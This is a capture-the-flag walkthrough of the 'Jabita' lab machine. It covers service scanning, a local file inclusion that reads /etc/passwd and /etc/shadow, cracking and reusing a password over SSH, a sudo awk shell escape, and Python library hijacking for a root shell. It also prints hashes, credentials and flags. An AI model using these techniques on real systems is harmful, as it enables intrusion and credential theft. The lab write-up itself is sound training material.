+++
title = "Jabita - Walkthrough"
date = "2026-07-07"
author = "nvru"
description = "Walkthrough for the Jabita machine."
tags = ["ctf", "walkthrough", "linux", "apache", "lfi", "ssh", "sudo", "python-library-hijacking", "privilege-escalation"]
draft = false
+++

## Overview

- **Attacker IP:** `10.10.10.2`
- **Target Machine IP:** `10.10.10.15`

The objective was to enumerate the target, identify exposed services, gain initial access through a Local File Inclusion vulnerability, and escalate privileges through sudo misconfigurations and Python library hijacking.

![Machine information](/images/hmv/jabita/vm.png)

---

## Port Scanning

### RustScan

```bash
rustscan -a 10.10.10.15 -- -A -oA nmap/rust
```

### Results

```text
Open 10.10.10.15:22
Open 10.10.10.15:80

PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

---

### Nmap

```bash
nmap -sSCV -A -p22,80 -oA nmap/22_80 --min-rate=1000 10.10.10.15
```

### Results

```text
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3 (Ubuntu Linux; protocol 2.0)

80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))

Service Info:
OS: Linux
```

Only SSH and HTTP were exposed, so web enumeration was the obvious next step.

---

## Web Enumeration

Browsing to port 80 revealed a simple webpage with no immediately useful information.

![HTTP homepage](/images/hmv/jabita/http.png)

Inspecting the page source also revealed nothing interesting.

I also checked for `robots.txt`, but no useful entries were found.

![No robots.txt](/images/hmv/jabita/no_robots.png)

---

### Directory Enumeration

Since the default page did not provide any useful information, I performed directory brute forcing.

A hidden directory named:

```text
building
```

was discovered.

![Directory brute force](/images/hmv/jabita/dir_brute_force.png)

Inspecting the source code revealed a parameter that appeared to load files from the server.

The first thing to test was a Local File Inclusion vulnerability.

Reference:

- [https://hacktricks.wiki/en/pentesting-web/file-inclusion/index.html](https://hacktricks.wiki/en/pentesting-web/file-inclusion/index.html)

![Source code](/images/hmv/jabita/building_src.png)

Testing the parameter with `/etc/passwd` confirmed the vulnerability.

![Successful LFI](/images/hmv/jabita/suc_lfi.png)

The output revealed two local users:

```text
jack
jaba
```

It also revealed that LXD was installed on the machine.

---

### Reading Sensitive Files

After confirming the LFI vulnerability, I continued enumerating sensitive files.

Attempts to read files from user home directories, such as:

```text
.bash_history
.bashrc
```

were unsuccessful due to permission restrictions.

However, `/etc/shadow` was readable through the vulnerable parameter.

![Shadow via LFI](/images/hmv/jabita/shadow_lfi.png)

The password hashes for the local users were exposed:

```text
root:$y$j9T$avXO7BCR5/iCNmeaGmMSZ0$gD9m7w9/zzi1iC9XoaomnTHTp0vde7smQL1eYJ1V3u1

jack:$6$xyz$FU1GrBztUeX8krU/94RECrFbyaXNqU8VMUh3YThGCAGhlPqYCQryXBln3q2J2vggsYcTrvuDPTGsPJEpn/7U.0

jaba:$y$j9T$pWlo6WbJDbnYz6qZlM87d.$CGQnSEL8aHLlBY/4Il6jFieCPzj7wk54P8K4j/xhi/1
```

I attempted to crack the hashes using John the Ripper.

The password for `jack` was successfully recovered.

![John cracking](/images/hmv/jabita/john_jack.png)

---

## Initial Access

Using the recovered credentials:

```text
Username: jack
Password: joaninha
```

SSH access was successful.

![SSH as jack](/images/hmv/jabita/suc_ssh_jack.png)

---

## Privilege Escalation

### jack → jaba

The first thing I checked was sudo permissions.

```bash
sudo -l
```

![sudo permissions](/images/hmv/jabita/sudo_l_jack.png)

The user `jack` could execute `awk` as `jaba` without supplying a password.

Attempts to access `jaba`'s home directory were unsuccessful because of permission restrictions.

![No permission](/images/hmv/jabita/no_perm_home.png)

Using GTFOBins and the awk documentation, I found that `awk` can execute arbitrary system commands.

The following command spawned a shell as `jaba`:

```bash
sudo -u jaba /usr/bin/awk 'BEGIN {system("/bin/sh")}'
```

![AWK exploit](/images/hmv/jabita/exp_awk_sudo_jaba.png)

---

### jaba → root

After switching to `jaba`, I found the user flag and a Python history file.

Reading `.python_history` revealed:

```bash
chmod u+s /bin/bash
```

![Python history](/images/hmv/jabita/flag_py_hist.png)

This suggested that a SUID binary might have been created.

I searched for SUID files:

```bash
find / -perm -4000 -type f 2>/dev/null
```

However, no unusual SUID binaries were found.

![No SUID](/images/hmv/jabita/find_no_suid.png)

Running `sudo -l` again revealed a more interesting entry.

![sudo -l jaba](/images/hmv/jabita/sudo_l_jaba.png)

The user could execute:

```text
/usr/bin/python3 /usr/bin/clean.py
```

as root.

---

#### Python Library Hijacking

Inspecting `clean.py` showed that it imported a custom module:

```python
import wild
```

I searched for the module location:

```bash
find / -type f -name wild.py -ls 2>/dev/null
```

The discovered `wild.py` file was writable by all users.

I replaced its contents with:

```python
import os
os.system("bash -i")
```

Running the allowed sudo command executed the modified module as root.

![Root shell](/images/hmv/jabita/su_root.png)

---

## Credentials

```text
jack:joaninha
```

---

## Flags

```text
user:2e0942f09699435811c1be613cbc7a39

root:f4bb4cce1d4ed06fc77ad84ccf70d3fe
```
